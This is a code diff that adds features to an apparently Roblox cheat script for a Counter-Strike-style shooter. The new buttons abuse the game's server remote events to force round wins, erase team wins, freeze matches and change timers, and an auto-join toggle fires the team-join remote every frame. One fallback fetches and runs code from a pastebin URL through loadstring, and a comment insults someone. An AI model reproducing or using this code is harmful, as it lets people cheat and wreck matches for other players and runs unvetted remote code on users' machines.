@@ -4768,6 +4768,48 @@ game:GetService('RunService').Stepped:Connect(function()
 	end
 end) ]]
 
+local funny = luas:Sector("funny", "Right")
+
+funny:Element("Button", "CT win", nil, function()
+	local IDBody = game:GetService("ReplicatedStorage").Events.IDBody
+    game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = workspace.Status.Defused})
+end)
+funny:Element("Button", "T win", nil, function()
+	local IDBody = game:GetService("ReplicatedStorage").Events.IDBody
+    game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = workspace.Status.Exploded})
+end)
+funny:Element("Button", "remove ct wins", nil, function()
+	local IDBody = game:GetService("ReplicatedStorage").Events.IDBody
+    game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = workspace.Status.CTWins})
+end)
+funny:Element("Button", "remove t wins", nil, function()
+	local IDBody = game:GetService("ReplicatedStorage").Events.IDBody
+    game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = workspace.Status.TWins})
+end)
+funny:Element("Button", "freeze game", nil, function()
+	local IDBody = game:GetService("ReplicatedStorage").Events.IDBody
+    game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = workspace.Status.Preparation})
+end)
+funny:Element("Button", "set timer", nil, function()
+	local IDBody = game:GetService("ReplicatedStorage").Events.IDBody
+    game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = workspace.Status.Timer})
+end)
+funny:Element("Button", "all can respawn", nil, function()
+	local IDBody = game:GetService("ReplicatedStorage").Events.IDBody
+	game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = workspace.Status.CanRespawn})
+end)
+funny:Element("Button", "play all sounds", nil, function()
+	if game.SoundService.RespectFilteringEnabled == false then
+		for i,v in pairs(game.Workspace:GetDescendants()) do
+		if v:IsA("Sound") then
+		v:Play()
+		end
+		end
+		else
+		loadstring(game:HttpGetAsync("https://pastebin.com/raw/Ts8TSAZN", 0, true))()
+		notify("cant bypass?", warn(":("))
+		end
+	end)
 
 
 local varechka = something:Sector("varechka", "Left")
@@ -5650,6 +5692,8 @@ crosshaireditor:Element("Slider", "length", {min = 1, max = 15, default = 10}, U
 crosshaireditor:Element("Toggle", "border", nil, UpdateCrosshair)
 
 local client = misc:Sector("client", "Right")
+client:Element('Toggle', 'auto join team')
+client:Element('Dropdown', 'team', {options = {'CT', 'T'}})
 client:Element("Toggle", "infinite cash", nil, function(tbl)
 	if tbl.Toggle then
 		LocalPlayer.Cash.Value = 8000
@@ -6376,6 +6420,9 @@ RunService.RenderStepped:Connect(function(step)
 		if values.misc.client["infinite crouch"].Toggle then  
 			Client.crouchcooldown = 0  
 		end 
+		if values.misc.client['auto join team'].Toggle then
+			game:GetService('ReplicatedStorage').Events.JoinTeam:FireServer(values.misc.client['team'].Dropdown)
+		end
 
 		---J. u fucking loser
 
